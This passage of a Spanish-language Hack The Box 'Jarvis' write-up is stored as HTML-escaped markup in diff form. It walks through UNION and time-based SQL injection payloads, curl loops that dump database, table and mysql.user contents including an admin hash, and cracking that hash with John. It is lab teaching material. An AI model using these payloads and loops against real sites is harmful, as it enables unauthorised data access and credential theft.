-|   /images/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.25 (debian)'&lt;/span&gt;
-|_  /js/: Potentially interesting directory w/ listing on &lt;span class=&quot;s1&quot;&gt;'apache/2.4.25 (debian)'&lt;/span&gt;
-
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;14.10 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos un recurso interesante, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phpmyadmin&lt;/code&gt; que si ingresamos, tenemos el panel de login:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-web3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;En este punto, sabemos que existe una base de datos en donde se tienen las habitaciones y la podemos cambiar a través de la URL; por lo que vamos a tratar de realizar unas inyeccions SQL para que ver pasa.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;10.10.10.143/room.php?cod=3’ or 1=1– - &amp;gt; Desaparece las imagen y el precio.&lt;/li&gt;
-  &lt;li&gt;10.10.10.143/room.php?cod=1 and sleep(5)– - &amp;gt; Vemos que la web tarda 5 segundos en responder, por lo tanto podría ser vulnerable a SQLi basada en tiempo.&lt;/li&gt;
-  &lt;li&gt;10.10.10.143/room.php?cod=0 union select 1,2,3,4,5,6,7– - &amp;gt; Vemos que se nos muestran las etiquetas para las columnas de las tablas (se estuvo intentando desde 1 hasta donde se observara algún resultado y bajo un número que no mostrata información, en este caso 0). Por lo tanto, ya podríamos escoger un valor de los observamos para inyectar comandos y obtener información sobre la base de datos.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-web4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;10.10.10.143/room.php?cod=0 union select 1,2,database(),4,5,6,7– - &amp;gt; Sustituimos la etiqueta del número 3 por el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;databse()&lt;/code&gt; y al cargar deberíamos de ver que en el lugar donde antes estaba el 3, ahora vemos el nombre de la base de datos, para este caso es &lt;strong&gt;hotel&lt;/strong&gt;.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-web5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;10.10.10.143/room.php?cod=0 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 0,1– - &amp;gt; Vemos las bases de datos en el servidor y vamos recorriendolas con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;limit 0,1&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;limit 1,1&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;limit 2,1&lt;/code&gt; y así sucesivamente. Por lo que tenemos las siguientes bases de datos:
-    &lt;ul&gt;
-      &lt;li&gt;hotel&lt;/li&gt;
-      &lt;li&gt;information_schema&lt;/li&gt;
-      &lt;li&gt;mysql&lt;/li&gt;
-      &lt;li&gt;performance_schema&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Una forma de obtener las tablas sería con el siguiente comando:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;0 10&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[*] DB &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.10.143/room.php?cod=0%20union%20select%201,2,schema_name,4,5,6,7%20from%20information_schema.schemata%20limit%20&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,1--%20-&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;price-room&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;FS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 1&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;2&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; DB 0: hotel
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; DB 1: information_schema
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; DB 2: mysql
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; DB 3: performance_schema
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; DB 4: 
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; DB 5: 
-^C#
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De manera similar, podríamos obtener los nombres de las tablas con la sentencia &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.143/room.php?cod=0 union select 1,2,table_name,4,5,6,7 from information_schema.tables limit 0,1-- -&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;0 150&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[*] Tabla &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.10.143/room.php?cod=0%20union%20select%201,2,table_name,4,5,6,7%20from%20information_schema.tables%20limit%20&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,1--%20-&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;price-room&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;FS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 1&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;2&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 0: room
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 1: ALL_PLUGINS
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 2: APPLICABLE_ROLES
-^C#                  
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Para este caso y para adelantar un poco, vamos a empezar desde la tabla 100:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;100 150&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[*] Tabla &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.10.143/room.php?cod=0%20union%20select%201,2,table_name,4,5,6,7%20from%20information_schema.tables%20limit%20&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,1--%20-&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;price-room&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;FS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 1&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;2&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 100: slow_log
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 101: table_stats
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 102: tables_priv
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 103: time_zone
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 104: time_zone_leap_second
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 105: time_zone_name
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 106: time_zone_transition
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 107: time_zone_transition_type
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 108: user
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 109: accounts
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 110: cond_instances
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 111: events_stages_current
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 112: events_stages_history
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 113: events_stages_history_long
-^C#                                                                                                                              
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya vemos una tabla interesante &lt;strong&gt;user&lt;/strong&gt;; asi que vamos a tratar de obtener las columnas con la inyección &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.143/room.php?cod=0 union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_name='user' limit 0,1-- -&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;0 100&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[*] Columna &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.10.143/room.php?cod=0%20union%20select%201,2,column_name,4,5,6,7%20from%20information_schema.columns%20where%20table_name%20=%20'user'limit%20&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,1--%20-&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;price-room&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;FS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 1&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;2&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 0: Host
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 1: User
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 2: Password
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 3: Select_priv
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 4: Insert_priv
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 5: Update_priv
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 6: Delete_priv
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 7: Create_priv
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 8: Drop_priv
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 9: Reload_priv
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 10: Shutdown_priv
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 11: Process_priv
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 12: File_priv
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 13: Grant_priv
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 14: References_priv
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 15: Index_priv
-^C#  
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos dos columnas que ya nos llaman la atención, &lt;strong&gt;User&lt;/strong&gt; y &lt;strong&gt;Password&lt;/strong&gt;; así que ahora vamos a tratar de obtener la información de la tabla &lt;strong&gt;user&lt;/strong&gt; y en específico, dichas columnas. Eso lo lograremos con la inyección &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.143/room.php?cod=0 union select 1,2,group_contact(User,0x3a,Password),4,5,6,7 from mysql.user&lt;/code&gt; (&lt;strong&gt;Nota&lt;/strong&gt;: Determinamos que la tabla &lt;strong&gt;user&lt;/strong&gt; se encuentra en la base de datos &lt;strong&gt;mysql&lt;/strong&gt; debido a que el sitio web no presenta una página relacionada al login, por lo tanto la base de datos &lt;strong&gt;hotel&lt;/strong&gt; no podría contener alguna tabla en donde se presenten usuarios y contraseñas):&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;0 10&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[*] Data &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.10.143/room.php?cod=0%20union%20select%201,2,group_concat(User,0x3a,Password),4,5,6,7%20from%20mysql.user%20limit%20&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,1--%20-&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;price-room&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;FS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 1&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;2&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Data 0: DBadmin:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Data 1: 
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Data 2: 
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Data 3: 
-^C#        
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya tenemos unas credenciales que podrían ser del panel de administración de phpmyadmin y debemos recordar que la contraseña se encuentra hasheada, por lo tanto vamos a utilizar la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt; para crackearla, así que nos creamos un archivo en donde pongamos el hash (DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0) y procedemos a utilizar la herramienta:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt &lt;span class=&quot;nb&quot;&gt;hash
-&lt;/span&gt;Using default input encoding: UTF-8
-Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mysql-sha1, MySQL 4.1+ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SHA1 256/256 AVX2 8x]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Warning: no OpenMP support &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;this &lt;span class=&quot;nb&quot;&gt;hash type&lt;/span&gt;, consider &lt;span class=&quot;nt&quot;&gt;--fork&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8
-Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
-imissyou         &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DBadmin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
